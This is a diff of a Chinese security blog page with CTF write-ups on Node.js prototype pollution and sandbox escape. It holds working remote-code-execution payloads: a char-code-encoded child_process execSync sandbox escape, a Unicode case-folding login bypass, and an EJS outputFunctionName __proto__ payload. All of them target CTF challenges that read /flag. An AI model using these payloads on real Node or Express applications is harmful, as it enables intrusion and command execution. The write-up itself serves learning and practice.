 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    s = <span class="string">f&quot;return process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;<span class="subst">&#123;cmd&#125;</span>&#x27;).toString()&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;,&#x27;</span>.join([<span class="built_in">str</span>(<span class="built_in">ord</span>(i)) <span class="keyword">for</span> i <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(gen(<span class="string">&#x27;cat /flag&#x27;</span>))</span><br></pre></td></tr></table></figure>
-
 <p>可以利用字符串拼接出string：</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="built_in">Math</span>+<span class="number">1</span></span><br><span class="line"><span class="string">&#x27;[object Math]1&#x27;</span></span><br></pre></td></tr></table></figure>
-
 <p>箭头函数表示自调用<code>(()=&gt;())()</code>，例子：</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;123123&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">a();</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> b = <span class="function">(<span class="params">x</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;;</span><br><span class="line">b(<span class="number">123</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> c = <span class="function">(<span class="params">x</span>) =&gt;</span> <span class="built_in">console</span>.log(x);</span><br><span class="line">c(<span class="number">123</span>);</span><br></pre></td></tr></table></figure>
-
 <p>最终payload：</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="params">Math</span>=&gt;</span></span><br><span class="line">    (<span class="built_in">Math</span>=<span class="built_in">Math</span>.constructor,</span><br><span class="line">            <span class="built_in">Math</span>.constructor(</span><br><span class="line">                <span class="built_in">Math</span>.fromCharCode(<span class="number">114</span>,<span class="number">101</span>,<span class="number">116</span>,<span class="number">117</span>,<span class="number">114</span>,<span class="number">110</span>,<span class="number">32</span>,<span class="number">112</span>,<span class="number">114</span>,<span class="number">111</span>,</span><br><span class="line">                    <span class="number">99</span>,<span class="number">101</span>,<span class="number">115</span>,<span class="number">115</span>,<span class="number">46</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">77</span>,<span class="number">111</span>,<span class="number">100</span>,<span class="number">117</span>,<span class="number">108</span>,<span class="number">101</span>,</span><br><span class="line">                    <span class="number">46</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">113</span>,<span class="number">117</span>,<span class="number">105</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">40</span>,<span class="number">39</span>,<span class="number">99</span>,<span class="number">104</span>,<span class="number">105</span>,<span class="number">108</span>,<span class="number">100</span>,</span><br><span class="line">                    <span class="number">95</span>,<span class="number">112</span>,<span class="number">114</span>,<span class="number">111</span>,<span class="number">99</span>,<span class="number">101</span>,<span class="number">115</span>,<span class="number">115</span>,<span class="number">39</span>,<span class="number">41</span>,<span class="number">46</span>,<span class="number">101</span>,<span class="number">120</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">83</span>,</span><br><span class="line">                    <span class="number">121</span>,<span class="number">110</span>,<span class="number">99</span>,<span class="number">40</span>,<span class="number">39</span>,<span class="number">99</span>,<span class="number">97</span>,<span class="number">116</span>,<span class="number">32</span>,<span class="number">47</span>,<span class="number">102</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">103</span>,<span class="number">39</span>,<span class="number">41</span>))()</span><br><span class="line">    )</span><br><span class="line">)(<span class="built_in">Math</span>+<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
-
-<h2 id="GYCTF2020-Ez-Express"><a href="#GYCTF2020-Ez-Express" class="headerlink" title="[GYCTF2020]Ez_Express"></a>[GYCTF2020]Ez_Express</h2><p><code>www.zip</code> 下载，在route&#x2F;index.js，有merge和clone，那就是了，</p>
+<h2 id="gyctf2020ez_express">[GYCTF2020]Ez_Express</h2>
+<p><code>www.zip</code> 下载，在route/index.js，有merge和clone，那就是了，</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="string">&#x27;/action&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (req.session.user.user != <span class="string">&quot;ADMIN&quot;</span>) &#123; res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>) &#125;</span><br><span class="line">    req.session.user.data = clone(req.body);</span><br><span class="line">    res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
-
 <p>需要是admin才能clone，login：</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safeKeyword</span>(<span class="params">keyword</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (keyword.match(<span class="regexp">/(admin)/i</span>s)) &#123;</span><br><span class="line">        <span class="keyword">return</span> keyword</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">undefined</span></span><br><span class="line">&#125;</span><br><span class="line">router.post(<span class="string">&#x27;/login&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (req.body.Submit == <span class="string">&quot;register&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (safeKeyword(req.body.userid)) &#123;</span><br><span class="line">            res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        req.session.user = &#123;</span><br><span class="line">            <span class="string">&#x27;user&#x27;</span>: req.body.userid.toUpperCase(),</span><br><span class="line">            <span class="string">&#x27;passwd&#x27;</span>: req.body.pwd,</span><br><span class="line">            <span class="string">&#x27;isLogin&#x27;</span>: <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">        res.redirect(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (req.body.Submit == <span class="string">&quot;login&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!req.session.user) &#123; res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;register first&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>) &#125;</span><br><span class="line">        <span class="keyword">if</span> (req.session.user.user == req.body.userid &amp;&amp; req.body.pwd == req.session.user.passwd) &#123;</span><br><span class="line">            req.session.user.isLogin = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;error passwd&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    res.redirect(<span class="string">&#x27;/&#x27;</span>);;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
-
 <p>匹配大小写之后<code>toUpperCase</code>转为大写，p牛的一篇文章：</p>
 <blockquote>
-<p>  Fuzz中的javascript大小写特性</p>
-<p>  <a target="_blank" rel="noopener" href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html</a></p>
+<p>Fuzz中的javascript大小写特性</p>
+<p>https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html</p>
 </blockquote>
 <p>注册admın</p>
 <p>之后就到了漏洞部分：</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="string">&#x27;/action&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (req.session.user.user != <span class="string">&quot;ADMIN&quot;</span>) &#123; res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>) &#125;</span><br><span class="line">    req.session.user.data = clone(req.body);</span><br><span class="line">    res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
-
-<p>payload的构造：<a target="_blank" rel="noopener" href="https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/">https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/</a></p>
-<p><code>&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a;return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;cat /flag&#39;)//&quot;&#125;,&quot;Submit&quot;:&quot;&quot;&#125;</code></p>
-<p>改application&#x2F;json，之后访问info得flag。</p>
+<p>payload的构造：https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/</p>
+<p><code>&#123;"__proto__":&#123;"outputFunctionName":"a;return global.process.mainModule.constructor._load('child_process').execSync('cat /flag')//"&#125;,"Submit":""&#125;</code></p>
+<p>改application/json，之后访问info得flag。</p>
 <p>end.</p>
 <hr>
 <blockquote>
-<p>  <a target="_blank" rel="noopener" href="https://www.cnblogs.com/ophxc/p/13298896.html">https://www.cnblogs.com/ophxc/p/13298896.html</a><br>  <a target="_blank" rel="noopener" href="https://as1def.github.io/2021/01/24/NodeJs%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%88%B0%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">https://as1def.github.io/2021/01/24/NodeJs%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%88%B0%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</a><br>  <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/236182">https://www.anquanke.com/post/id/236182</a><br>  <a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/200406.html">https://www.freebuf.com/articles/web/200406.html</a><br>  <a target="_blank" rel="noopener" href="https://www.cnblogs.com/tr1ple/p/11360881.html">https://www.cnblogs.com/tr1ple/p/11360881.html</a><br>  <a target="_blank" rel="noopener" href="https://0xcreed.jxustctf.top/2020/06/nodejs%E5%AD%A6%E4%B9%A0/">https://0xcreed.jxustctf.top/2020/06/nodejs%E5%AD%A6%E4%B9%A0/</a><br>  <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7184#toc-3">https://xz.aliyun.com/t/7184#toc-3</a><br>  <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7182">https://xz.aliyun.com/t/7182</a><br>  <a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html</a><br>  <a target="_blank" rel="noopener" href="https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/">https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/</a><br>  <a target="_blank" rel="noopener" href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html</a></p>
+<p>https://www.cnblogs.com/ophxc/p/13298896.html https://as1def.github.io/2021/01/24/NodeJs%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%88%B0%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/ https://www.anquanke.com/post/id/236182 https://www.freebuf.com/articles/web/200406.html https://www.cnblogs.com/tr1ple/p/11360881.html https://0xcreed.jxustctf.top/2020/06/nodejs%E5%AD%A6%E4%B9%A0/ https://xz.aliyun.com/t/7184#toc-3 https://xz.aliyun.com/t/7182 https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/ https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html</p>
 </blockquote>
 
     </article>
@@ -765,7 +759,7 @@
                 <div class="toc-catalog">
                     <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
                 </div>
-                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#NodeJs%E5%9F%BA%E7%A1%80"><span class="toc-number">1.</span> <span class="toc-text">NodeJs基础</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#child-process-%E5%88%9B%E5%BB%BA%E5%AD%90%E8%BF%9B%E7%A8%8B"><span class="toc-number">1.1.</span> <span class="toc-text">child_process(创建子进程)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Javascript%E5%8E%9F%E5%9E%8B%E9%93%BE"><span class="toc-number">1.2.</span> <span class="toc-text">Javascript原型链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E5%9E%8B%E4%B8%8E%E5%8E%9F%E5%9E%8B%E9%93%BE"><span class="toc-number">1.2.1.</span> <span class="toc-text">原型与原型链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E5%9E%8B%E7%9A%84%E5%AE%9A%E4%B9%89%E5%92%8C%E7%BB%A7%E6%89%BF"><span class="toc-number">1.2.2.</span> <span class="toc-text">原型的定义和继承</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NodeJs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">2.</span> <span class="toc-text">NodeJs原型链污染</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CTF%E9%A2%98%E7%9B%AE"><span class="toc-number">3.</span> <span class="toc-text">CTF题目</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#NPUCTF2020-%E9%AA%8C%E8%AF%81%F0%9F%90%8E"><span class="toc-number">3.1.</span> <span class="toc-text">[NPUCTF2020]验证🐎</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MD5"><span class="toc-number">3.1.1.</span> <span class="toc-text">MD5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87"><span class="toc-number">3.1.2.</span> <span class="toc-text">正则绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GYCTF2020-Ez-Express"><span class="toc-number">3.2.</span> <span class="toc-text">[GYCTF2020]Ez_Express</span></a></li></ol></li></ol>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#nodejs%E5%9F%BA%E7%A1%80"><span class="toc-number">1.</span> <span class="toc-text">NodeJs基础</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#child_process%E5%88%9B%E5%BB%BA%E5%AD%90%E8%BF%9B%E7%A8%8B"><span class="toc-number">1.1.</span> <span class="toc-text">child_process(创建子进程)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#javascript%E5%8E%9F%E5%9E%8B%E9%93%BE"><span class="toc-number">1.2.</span> <span class="toc-text">Javascript原型链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E5%9E%8B%E4%B8%8E%E5%8E%9F%E5%9E%8B%E9%93%BE"><span class="toc-number">1.2.1.</span> <span class="toc-text">原型与原型链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E5%9E%8B%E7%9A%84%E5%AE%9A%E4%B9%89%E5%92%8C%E7%BB%A7%E6%89%BF"><span class="toc-number">1.2.2.</span> <span class="toc-text">原型的定义和继承</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">2.</span> <span class="toc-text">NodeJs原型链污染</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ctf%E9%A2%98%E7%9B%AE"><span class="toc-number">3.</span> <span class="toc-text">CTF题目</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#npuctf2020%E9%AA%8C%E8%AF%81"><span class="toc-number">3.1.</span> <span class="toc-text">[NPUCTF2020]验证🐎</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#md5"><span class="toc-number">3.1.1.</span> <span class="toc-text">MD5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87"><span class="toc-number">3.1.2.</span> <span class="toc-text">正则绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gyctf2020ez_express"><span class="toc-number">3.2.</span> <span class="toc-text">[GYCTF2020]Ez_Express</span></a></li></ol></li></ol>
             </div>
         
         <!-- sidebar -->
@@ -1247,506 +1241,6 @@
         
         
         
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
     
     
     
@@ -1785,7 +1279,7 @@
         
         <li class="archive-post-item">
             <span class="archive-post-date">07/10</span>
-            <a class="archive-post-title" href="/2022/07/10/2022-7-10-oslab/">MIT6.S081_Lab</a>
+            <a class="archive-post-title" href="/2022/07/10/2022-7-10-oslab/">MIT6S081lab</a>
         </li>
     
         
@@ -2207,14 +1701,14 @@
                 Life
             </span>
         
+            <span class="sidebar-tag-name" data-tags="OS">
+                <span class="iconfont-archer">&#xe606;</span>
+                OS
+            </span>
+        
             <span class="sidebar-tag-name" data-tags="PWN">
                 <span class="iconfont-archer">&#xe606;</span>
                 PWN
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="WEB">
-                <span class="iconfont-archer">&#xe606;</span>
-                WEB
             </span>
         
             <span class="sidebar-tag-name" data-tags="RE">
@@ -2227,14 +1721,14 @@
                 BUU刷题
             </span>
         
+            <span class="sidebar-tag-name" data-tags="WEB">
+                <span class="iconfont-archer">&#xe606;</span>
+                WEB
+            </span>
+        
             <span class="sidebar-tag-name" data-tags="Java">
                 <span class="iconfont-archer">&#xe606;</span>
                 Java
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="免杀">
-                <span class="iconfont-archer">&#xe606;</span>
-                免杀
             </span>
         
             <span class="sidebar-tag-name" data-tags="内网">
@@ -2242,19 +1736,24 @@
                 内网
             </span>
         
+            <span class="sidebar-tag-name" data-tags="免杀">
+                <span class="iconfont-archer">&#xe606;</span>
+                免杀
+            </span>
+        
             <span class="sidebar-tag-name" data-tags="VulnHub">
                 <span class="iconfont-archer">&#xe606;</span>
                 VulnHub
             </span>
         
-            <span class="sidebar-tag-name" data-tags="内核">
-                <span class="iconfont-archer">&#xe606;</span>
-                内核
-            </span>
-        
             <span class="sidebar-tag-name" data-tags="渗透">
                 <span class="iconfont-archer">&#xe606;</span>
                 渗透
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="内核">
+                <span class="iconfont-archer">&#xe606;</span>
+                内核
             </span>
         
             <span class="sidebar-tag-name" data-tags="漏洞复现">
@@ -2275,11 +1774,6 @@
             <span class="sidebar-tag-name" data-tags="汇编">
                 <span class="iconfont-archer">&#xe606;</span>
                 汇编
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="OS">
-                <span class="iconfont-archer">&#xe606;</span>
-                OS
             </span>
         
             <span class="sidebar-tag-name" data-tags="WriteUp">
